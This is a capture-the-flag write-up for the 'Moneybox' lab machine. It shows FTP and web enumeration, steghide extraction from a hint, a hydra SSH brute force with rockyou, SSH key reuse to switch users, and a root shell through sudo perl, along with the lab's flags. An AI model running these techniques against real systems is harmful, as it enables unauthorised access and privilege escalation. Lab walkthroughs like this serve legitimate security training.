# Moneybox

## Initial access

Run `autorecon` to enumerate the target:

```
sudo autorecon 192.168.240.230
```

Open ports discovered:

- **21** — FTP (vsftpd 3.0.3)
  - Anonymous login allowed
- **22** — SSH (OpenSSH 7.9p1 Debian 10+deb10u2, protocol 2.0)
- **80** — HTTP (Apache httpd 2.4.38, Debian)
  - Additional webpages:
    - `http://192.168.240.230/blogs`

### FTP Enumeration

Connected to FTP as anonymous and downloaded `trytofind.jpg`:

```
ftp anonymous@192.168.240.230
ftp> ls -al
drwxr-xr-x    2 0        0            4096 Feb 26  2021 .
drwxr-xr-x    2 0        0            4096 Feb 26  2021 ..
-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
ftp> get trytofind.jpg
```

Ran `exiftool` on the image, but no useful metadata was found.

### Web Enumeration

The root path displayed a welcome page for the "MoneyBox CTF" with a note saying "it's a very simple Box, so don't overthink."

The `/blogs` page introduced "T0m-H4ck3r" and hinted at a secret directory. Inspecting the page source revealed:

```html
<!--the hint is the another secret directory is S3cr3t-T3xt-->
```

Navigating to `/S3cr3t-T3xt` showed an empty page. Inspecting its source revealed another hint:

```html
<!..Secret Key 3xtr4ctd4t4 >
```

Used the secret key to extract hidden data from the image using `steghide`:

```
steghide extract -sf trytofind.jpg
Enter passphrase: 3xtr4ctd4t4
wrote extracted data to "data.txt"
```

The extracted `data.txt` contained a message:

```
Hello.....  renu

I tell you something Important. Your Password is too Week So Change Your Password
Don't Underestimate it.......
```

This revealed a username (`renu`) and indicated the password was weak. Brute-forced SSH with `hydra`:

```
hydra -l renu -P /usr/share/wordlists/rockyou.txt ssh://192.168.240.230/
[22][ssh] host: 192.168.240.230   login: renu   password: 987654321
```

Logged in via SSH:

```
ssh renu@192.168.240.230
renu@192.168.240.230's password: 987654321

renu@lab-pg-debian10-moneybox-241-190:~$ whoami
renu
```

Retrieved the local flag:

```
renu@lab-pg-debian10-moneybox-241-190:~$ cat local.txt
18a983f4f510f48ea7b12c854272dd5b
```

## Privilege escalation

Uploaded `linpeas.sh` via `scp`:

```
scp linpeas.sh.txt renu@192.168.240.230:/tmp
```

Ran `linpeas.sh`. The key finding was passwords in the bash history:

```
/home/renu/.bash_history:ssh-keygen -t rsa
/home/renu/.bash_history:ssh-copy-id lily@192.168.43.80
/home/renu/.bash_history:ssh -i id_rsa lily@192.168.43.80
/home/renu/.bash_history:su lily
```

This indicated the user had SSH'd into another account named `lily` on the same machine using key-based authentication. Used the existing private key to SSH as `lily`:

```
renu@lab-pg-debian10-moneybox-241-190:~/.ssh$ ssh -i id_rsa lily@192.168.240.230

lily@lab-pg-debian10-moneybox-241-190:~$ whoami
lily
```

Checked sudo privileges:

```
lily@lab-pg-debian10-moneybox-241-190:~$ sudo -l
User lily may run the following commands on lab-pg-debian10-moneybox-241-190:
    (ALL : ALL) NOPASSWD: /usr/bin/perl
```

Gained a privileged shell using `perl` via GTFOBins:

```
lily@lab-pg-debian10-moneybox-241-190:~$ sudo perl -e 'exec "/bin/sh"'
# whoami
root
```

Retrieved the proof flag:

```
# cd /root
# cat proof.txt
ef0d72a1f24d1386798f8914ea7cb9c8
```
